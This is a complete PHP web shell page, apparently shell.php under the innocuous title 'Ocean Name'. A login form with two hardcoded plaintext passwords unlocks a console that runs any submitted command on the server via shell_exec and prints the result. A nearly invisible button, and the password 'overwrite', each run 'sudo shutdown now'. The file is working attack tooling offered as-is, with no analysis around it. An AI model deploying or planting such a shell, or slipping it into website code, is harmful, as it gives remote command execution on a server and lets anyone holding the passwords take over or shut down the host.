<!DOCTYPE html>
<html lang="en" >

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1"> 
	<title>Ocean Name</title>
	<link rel="icon" href="../assets/image/icon.ico"> 
	<link rel="shortcut icon" href="../assets/image/icon.ico"/>
	<style>
	pre { 
		white-space: pre-wrap;
		white-space: -moz-pre-wrap !important;
		white-space: -pre-wrap;
		white-space: -o-pre-wrap;
		word-wrap: break-word;
	}
	body{
		background-color: #000;
		font-family: Courier New;	
		color: #00ff00;
		padding: 20px;    
	}
	</style>
</head>

<body>	
<form id="cmdf" method="post" action="" style='display: none;'>
	<input type="text" name="cmd" id="cmd" style="width:70%" value="">
	<input type="submit" name="submit" style="width:15%" value="Run"> 
	<input type="submit" name="logout" style="width:8%" value="Logout"> 
	<input id="button" type="submit" name="submitsd" class="button" style="width:3%;" value=" ">
</form>

<form id="pass" method="post" action="" style='display: block;'>
	<input id="p1" name="p1" type="password" style="width:100%" >
	<input id="p2" name="p2" type="password" style="width:100%" >
	<input id="button" type="submit" name="submitp" class="button" style="width:100%;" value="Submit">
</form>

<pre>
<?php
session_start();
if ($_SESSION['p1']=="overwrite"){
	shell_exec("sudo shutdown now");
}else if ($_SESSION['p1']=="Tatdat0916" && $_SESSION['p2']=="Tatdat0922"){
	echo "<script>document.getElementById('pass').style.display = 'none';</script>";
	echo "<script>document.getElementById('cmdf').style.display = 'block';</script>";
}else{
	echo "<script>document.getElementById('pass').style.display = 'block';</script>";
	echo "<script>document.getElementById('cmdf').style.display = 'none';</script>";
}

if(isset($_POST['submitp'])){
	$_SESSION['p1'] = $_POST['p1'];
	$_SESSION['p2'] = $_POST['p2'];
	header("location:shell.php");
	exit();
}
if(isset($_POST['submit'])){
	if ($_SESSION['p1']=="Tatdat0916" && $_SESSION['p2']=="Tatdat0922"){
		print_r(shell_exec($_POST['cmd']));
	}
}
if(isset($_POST['logout'])){
	session_destroy();
	header("location:shell.php");
	exit();
}
if(isset($_POST['submitsd'])){
	shell_exec("sudo shutdown now");
}
?>
</pre>
</div>
</body>
</html>
